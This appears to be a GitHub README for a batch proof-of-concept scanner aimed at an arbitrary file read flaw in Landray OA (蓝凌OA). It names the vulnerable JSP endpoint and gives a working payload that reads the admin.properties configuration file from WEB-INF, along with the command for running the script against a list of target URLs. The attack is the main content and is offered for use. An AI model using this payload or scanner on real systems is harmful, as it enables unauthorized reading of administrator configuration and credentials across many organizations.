# lanlinOA-upload
蓝凌OA 任意文件读取漏洞 poc脚本--批量

漏洞存在接口：  /sys/ui/extend/varkind/custom.jsp

Payload:var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}

py脚本使用：python3 poc.py -f url.txt(存在漏洞目标url存放在result.txt）
![image](https://github.com/1daomeidan/lanlinOA-upload/assets/143391153/dd7816d6-df8f-4214-82b9-ce803dd6841b)
![image](https://github.com/1daomeidan/lanlinOA-upload/assets/143391153/1b0baa90-a605-4abc-9e0f-e1b353641e32)


